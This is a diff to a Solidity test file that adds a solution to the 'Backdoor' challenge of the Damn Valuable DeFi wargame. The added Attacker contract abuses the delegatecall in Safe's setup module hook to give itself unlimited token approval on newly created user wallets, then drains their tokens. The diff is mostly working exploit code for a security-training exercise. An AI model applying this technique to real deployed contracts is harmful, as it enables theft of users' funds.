@@ -70,7 +70,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        attacker.attack(token, singletonCopy, walletFactory, walletRegistry, users, recovery);
     }
 
     /**
@@ -92,5 +93,71 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attacker {
+    function attack(
+        DamnValuableToken token,
+        Safe singletonCopy,
+        SafeProxyFactory walletFactory,
+        WalletRegistry walletRegistry,
+        address[] memory users,
+        address recovery
+    ) external {
+        // This attack exploits the fact that each Safe wallet created on behalf of
+        // a user will receive tokens upon initialization. We bypass certain
+        // restrictions in the WalletRegistry by leveraging the ModuleManager's
+        // setupModules function, which is called within Safe::setup. This allows us
+        // to perform a delegate call, setting token approval for this contract during
+        // the wallet setup process.
+        //
+        // The goal is to create a wallet for each user, set an approval for the
+        // attacker contract to transfer the tokens, and then extract the tokens from
+        // each newly created wallet.
+        address[] memory owners = new address[](1);
+
+        for (uint8 i = 0; i < users.length; i++) {
+            // Set the current user as the owner of the wallet to be created
+            owners[0] = users[i];
+
+            bytes memory setupData = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(this),
+                abi.encodeWithSelector(
+                    Attacker.setTokenApprove.selector,
+                    token,
+                    address(this)
+                ),
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+
+            walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                setupData,
+                0,
+                walletRegistry
+            );
+
+            // With the wallet created, pass the funds to the recovery contract
+            token.transferFrom(walletRegistry.wallets(users[i]), address(this), 10 ether);
+            token.transfer(recovery, 10 ether);
+        }
+    }
+
+    // This function is invoked via a delegate call from the Safe::setup call.
+    // Its purpose is to set an unlimited approval for the attacker contract to
+    // spend the victim's tokens.
+    //
+    // Note: Since this is a delegate call, the parameters must be passed
+    // explicitly, as opposed to relying on the contract's state variables or `this`
+    // pointer.
+    function setTokenApprove(DamnValuableToken token, address attackerAddress) external {
+        token.approve(attackerAddress, type(uint256).max);
     }
 }
